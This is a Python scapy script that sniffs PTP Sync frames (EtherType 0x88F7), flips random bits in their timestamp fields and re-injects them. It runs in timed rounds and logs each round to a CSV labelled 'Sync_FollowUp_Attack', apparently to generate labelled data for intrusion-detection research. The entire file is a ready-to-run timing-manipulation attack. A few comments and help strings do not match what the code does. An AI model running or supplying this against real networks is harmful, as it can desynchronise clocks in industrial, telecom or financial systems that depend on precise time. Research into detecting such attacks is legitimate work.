from scapy.all import *
from scapy.all import Ether
import time
import argparse
from functools import partial
import random
import csv


def log_attack_start_end(attack_type, start_time, end_time, filename):
    # Open the file in append mode
    with open(filename, mode='a', newline='') as file:
        writer = csv.writer(file)
        writer.writerow([attack_type, start_time, end_time])


# Function to flip a random bit in a byte sequence
def flip_random_bit(data):
    # Convert data to a list of bits
    bits = list(bin(int.from_bytes(data, byteorder='big'))[2:].zfill(len(data) * 8))
    # Choose a random bit index to flip
    bit_index = random.randint(0, len(bits) - 1)
    # Flip the bit
    bits[bit_index] = '0' if bits[bit_index] == '1' else '1'
    # Convert bits back to bytes
    new_data = int(''.join(bits), 2).to_bytes(len(data), byteorder='big')
    return new_data


def sync_filter(packet, interface):
    if Ether in packet:
        if packet[Ether].type == 35063:
            if packet.load[0] == 0:
                # Extract the timestamp (seconds and nanoseconds) from the packet
                original_seconds = packet.load[34:40]
                original_nanoseconds = packet.load[40:44]
                
                # Randomly flip one bit in either seconds or nanoseconds
                modified_seconds = flip_random_bit(original_seconds)
                modified_nanoseconds = flip_random_bit(original_nanoseconds)
                
                # Modify the packet with the new timestamp
                packet.load = packet.load[:34] + modified_seconds + modified_nanoseconds + packet.load[44:]
                
                # Resend the modified packet
                sendp(packet, iface=interface)


parser = argparse.ArgumentParser()
parser.add_argument("-s", "--sleep", help="specify the sleep time", type=float)
parser.add_argument("-d", "--duration", help="specify the duration of the attack", type=float)
parser.add_argument("-i", "--interface", help="specify the interface", type=str, default='enp4s0')
parser.add_argument("-l", "--logs", help="specify the number of attack rounds", type=str)

args = parser.parse_args()
sniffer = partial(sync_filter, interface=args.interface)

while True:
    start_time = time.time()
    if args.sleep is not None and args.duration is not None:
        sniff(iface=args.interface, prn=sniffer, timeout=args.duration)
        end_time = time.time()
        time.sleep(args.sleep)
    else:
        sniff(iface=args.interface, prn=sniffer)
        end_time = time.time()
    log_attack_start_end("Sync_FollowUp_Attack", start_time, end_time, args.logs)
